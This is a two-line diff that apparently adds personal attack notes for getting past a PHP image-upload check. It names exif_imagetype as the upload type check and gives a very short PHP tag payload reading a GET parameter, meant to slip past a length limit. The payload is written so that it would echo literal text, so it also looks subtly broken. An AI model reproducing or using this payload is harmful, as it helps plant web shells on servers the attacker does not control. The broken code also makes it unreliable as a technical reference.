@@ -1,0 +1,2 @@
+exif_imagetype --> type upload
+bypass length --> <?='$_GET[x]'?>
